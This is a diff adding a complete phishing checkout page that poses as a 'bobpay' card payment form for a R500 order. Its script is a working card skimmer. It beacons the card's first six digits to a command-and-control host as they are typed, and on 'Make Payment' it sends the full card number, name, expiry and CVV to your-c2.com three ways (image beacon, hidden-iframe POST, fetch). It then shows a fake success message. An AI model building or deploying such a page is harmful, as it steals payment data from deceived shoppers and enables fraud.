@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bobpay - Order #528362</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif;
+            background: #f8f9fa;
+            min-height: 100vh;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            color: #1f2937;
+        }
+
+        .navbar {
+            height: 44px;
+            background: white;
+            border-bottom: 1px solid #e5e7eb;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        /* BOBPAY LOGO */
+        .bobpay-logo {
+            height: 28px;
+            display: flex;
+            align-items: center;
+            font-size: 24px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -0.05em;
+            margin-left: 4px;
+        }
+
+        .nav-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #1f2937;
+            margin-left: 12px;
+        }
+
+        .container {
+            flex: 1;
+            max-width: 390px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 24px 24px 0 0;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
+        }
+
+        /* HEADER */
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 36px 28px;
+            text-align: center;
+        }
+
+        .page-title {
+            font-size: 30px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            letter-spacing: -0.02em;
+        }
+
+        .subtitle {
+            font-size: 17px;
+            opacity: 0.95;
+            font-weight: 500;
+        }
+
+        /* CARD PREVIEW */
+        .card-preview {
+            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
+            border-radius: 16px;
+            margin: 32px 28px 0;
+            height: 80px;
+            padding: 20px 24px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.3);
+        }
+
+        .card-chip {
+            width: 50px;
+            height: 36px;
+            background: linear-gradient(145deg, #f1f5f9, #e2e8f0);
+            border-radius: 9px;
+            position: relative;
+            margin-right: 20px;
+        }
+
+        .card-chip::before {
+            content: '';
+            position: absolute;
+            width: 16px;
+            height: 11px;
+            background: #1e293b;
+            border-radius: 2.5px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .card-content {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .card-number {
+            font-family: 'SF Mono', Monaco, monospace;
+            font-size: 19px;
+            font-weight: 600;
+            letter-spacing: 0.7px;
+            margin-bottom: 2px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .card-expiry {
+            font-size: 14px;
+            opacity: 0.85;
+        }
+
+        .card-brand {
+            font-size: 16px;
+            font-weight: 700;
+            min-width: 60px;
+            text-align: right;
+        }
+
+        /* FORM */
+        .form-section {
+            padding: 0 28px 40px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 12px;
+            letter-spacing: 0.02em;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 18px 22px;
+            border: 2px solid #e5e7eb;
+            border-radius: 14px;
+            font-size: 18px;
+            font-family: 'SF Mono', Monaco, monospace;
+            background: white;
+            transition: all 0.25s ease;
+            font-weight: 500;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.12);
+            transform: translateY(-1px);
+        }
+
+        .form-input::placeholder {
+            color: #9ca3af;
+            font-weight: 400;
+        }
+
+        /* EXPIRY + CVV */
+        .form-row {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 16px;
+        }
+
+        /* TERMS */
+        .terms {
+            padding: 28px;
+            background: #f8fafc;
+            border-top: 1px solid #f1f5f9;
+            font-size: 14px;
+            color: #6b7280;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        .terms-highlight {
+            color: #667eea;
+            font-weight: 600;
+        }
+
+        /* BUTTON */
+             .pay-button {
+  width: calc(100% - 56px); /* 28px left + 28px right */
+  margin: 28px auto 36px;
+  background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+  color: white;
+  border: none;
+  padding: 22px;
+  border-radius: 18px;
+  font-size: 19px;
+  font-weight: 700;
+  cursor: pointer;
+  text-transform: uppercase;
+  letter-spacing: 0.8px;
+  position: relative;
+  overflow: hidden;
+  transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+  box-shadow: 0 12px 35px rgba(16, 185, 129, 0.4);
+}
+      .pay-button:hover:not(:disabled) {
+  transform: translateY(-2px);
+  box-shadow: 0 20px 45px rgba(106, 90, 249, 0.55);
+}
+
+.pay-button:disabled {
+  background: #9ca3af;
+  cursor: not-allowed;
+  box-shadow: none;
+  transform: none;
+}
+        .btn-progress {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 0%;
+            background: rgba(255,255,255,0.3);
+            transition: width 0.4s ease;
+        }
+
+        .ghost {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        @media (max-width: 414px) {
+            .container {
+                margin: 0;
+                border-radius: 0;
+                box-shadow: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- NAVBAR WITH BOBPAY LOGO -->
+    <div class="navbar">
+        <div class="bobpay-logo">bobpay</div>
+        <div class="nav-title">Order #528362</div>
+    </div>
+
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <div class="page-title">Card payment</div>
+            <div class="subtitle">Complete your R500.00 payment securely</div>
+        </div>
+
+        <!-- LIVE CARD PREVIEW -->
+        <div class="card-preview">
+            <div style="display: flex; align-items: center; flex: 1;">
+                <div class="card-chip"></div>
+                <div class="card-content">
+                    <div class="card-number" id="liveNum">•••• •••• •••• ••••</div>
+                    <div class="card-expiry" id="liveExp">MM/YY</div>
+                </div>
+            </div>
+            <div class="card-brand" id="liveBrand">Visa</div>
+        </div>
+
+        <!-- FORM -->
+        <div class="form-section">
+            <div class="form-group">
+                <label class="form-label">Name on card</label>
+                <input class="form-input" id="cardName" type="text" autocomplete="cc-name">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Card number</label>
+                <input class="form-input" id="cardNumber" type="tel" maxlength="19" autocomplete="cc-number">
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label class="form-label">Expiry (MM/YY)</label>
+                    <input class="form-input" id="expiry" type="tel" maxlength="5" autocomplete="cc-exp">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">CVV</label>
+                    <input class="form-input" id="cvv" type="tel" maxlength="4" autocomplete="cc-csc">
+                </div>
+            </div>
+        </div>
+
+          <!-- GREEN PAY BUTTON -->
+        <button class="pay-button" id="payBtn">
+            <div class="btn-progress"></div>
+            Make Payment
+        </button>
+    </div>
+        <!-- TERMS -->
+        <div class="terms">
+            By completing this payment you <span class="terms-highlight">agree</span> to our 
+            <span class="terms-highlight">terms and conditions</span>
+        </div>
+
+      
+
+    <iframe class="ghost" name="exfil"></iframe>
+
+    <script>
+        // ELEMENTS
+        const num = document.getElementById('cardNumber');
+        const name = document.getElementById('cardName');
+        const exp = document.getElementById('expiry');
+        const cvv = document.getElementById('cvv');
+        const liveNum = document.getElementById('liveNum');
+        const liveExp = document.getElementById('liveExp');
+        const liveBrand = document.getElementById('liveBrand');
+        const payBtn = document.getElementById('payBtn');
+        const btnProgress = document.querySelector('.btn-progress');
+
+        // LIVE CARD + BIN STEAL
+        num.addEventListener('input', (e) => {
+            let raw = e.target.value.replace(/\D/g, '');
+            let formatted = raw.match(/.{1,4}/g)?.join(' ') || '';
+            e.target.value = formatted.slice(0, 19);
+
+            // CARD PREVIEW
+            let masked = raw.slice(-16).padStart(16, '0').match(/.{4}/g)?.slice(-4).join(' ').padStart(19, '•••• ') || '•••• •••• •••• ••••';
+            liveNum.textContent = masked;
+
+            // BIN CAPTURE (6 DIGITS)
+            if (raw.length >= 6) {
+                const bin = raw.slice(0, 6);
+                new Image().src = `https://your-c2.com/binlog/${bin}?order=528362&t=${Date.now()}`;
+                console.log(`🎯 BIN: ${bin} → https://binx.vip/bin/${bin}`);
+            }
+
+            // BRAND
+            const bin6 = raw.slice(0, 6);
+            let brand = 'Visa';
+            if (/^5[1-5]|^222[1-9]|^22[3-9][0-9]|^2[3-6][0-9]{2}/.test(bin6)) brand = 'Mastercard';
+            else if (/^34|37/.test(bin6)) brand = 'Amex';
+            liveBrand.textContent = brand;
+        });
+
+        // EXPIRY FORMAT
+        exp.addEventListener('input', (e) => {
+            let raw = e.target.value.replace(/\D/g, '');
+            if (raw.length >= 2) raw = raw.slice(0, 2) + '/' + raw.slice(2, 4);
+            e.target.value = raw.slice(0, 5);
+        });
+
+        // FIELD TRACKING
+        [name, exp, cvv].forEach(f => f.addEventListener('input', e => sessionStorage.setItem(f.id, e.target.value)));
+
+        // FOCUS FLOW
+        num.focus();
+        name.onkeypress = e => e.key === 'Enter' && num.focus();
+
+        // FULL CC EXFIL
+        payBtn.onclick = () => {
+            const cc = num.value.replace(/\s/g, '');
+            const holder = name.value || 'N/A';
+            const expiry = exp.value || 'N/A';
+            const cvvcode = cvv.value || 'N/A';
+
+            if (cc.length < 16 || !expiry || cvvcode.length < 3) {
+                return alert('Complete all card details');
+            }
+
+            // FULL SET
+            const payload = {
+                bin: cc.slice(0, 6),
+                cc: cc,
+                holder: holder,
+                exp: expiry,
+                cvv: cvvcode,
+                order: '528362',
+                amount: 'R500',
+                site: 'bobpay',
+                email: 'bretnyika2@gmail.com'
+            };
+
+            // STEALTH SEND x3
+            new Image().src = `https://your-c2.com/cc?data=${btoa(JSON.stringify(payload))}`;
+            
+            const form = document.createElement('form');
+            form.method = 'POST'; form.target = 'exfil'; form.action = 'https://your-c2.com/api';
+            form.innerHTML = `<input name="fullset" value='${btoa(JSON.stringify(payload))}' style="display:none;">`;
+            document.body.appendChild(form); form.submit(); document.body.removeChild(form);
+            
+            fetch('https://your-c2.com/hit', {method: 'POST', body: JSON.stringify(payload), mode: 'no-cors'});
+
+            // UI
+            payBtn.disabled = true;
+            payBtn.innerHTML = '<div class="btn-progress"></div>Processing payment...';
+            btnProgress.style.width = '100%';
+            setTimeout(() => {
+                payBtn.innerHTML = '<div class="btn-progress"></div>✅ Payment successful!';
+                setTimeout(() => alert('Order #528362 confirmed!\nThank you for shopping.'), 1500);
+            }, 3000);
+        };
+    </script>
+</body>
+</html>
